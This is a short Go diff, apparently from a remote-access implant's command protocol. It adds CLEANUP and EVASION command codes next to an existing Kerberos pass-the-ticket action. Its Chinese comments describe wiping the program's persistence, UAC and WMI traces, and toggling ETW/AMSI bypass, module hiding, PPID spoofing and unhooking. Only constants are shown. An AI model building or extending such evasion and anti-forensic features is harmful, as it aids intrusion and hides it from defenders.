@@ -166,4 +166,15 @@ const (
 	// Kerberos 票据动作（阶段三，须与客户端一致）：cmdBuf = "list" |
 	// "purge [服务名]" | "ptt <base64 的 kirbi>"。Windows LSA 专有。
 	KERB_ACTION = 133
+
+	// 清理现场（P1，须与客户端 core/services/types.go 一致）：cmdBuf =
+	// "all|persist|files|uac|wmi"（可空格分隔，空串等价 all）。只清本程序自己
+	// 留下的持久化项 / 更新残留 / 提权与 WMI 副产物。
+	CLEANUP = 134
+
+	// 对抗能力开关（P4，须与客户端 core/services/types.go 一致）：cmdBuf =
+	// "" | "status" | "reset" | "all on|off" | "on <能力>" | "off <能力>"。
+	// 能力名：etw/amsi/modhide/spoof/ppid/blockdlls/unhook。覆盖只在客户端内存里，
+	// 不跨重连；启动期能力（etw/amsi/unhook）"on" 会立即执行一次。
+	EVASION = 135
 )
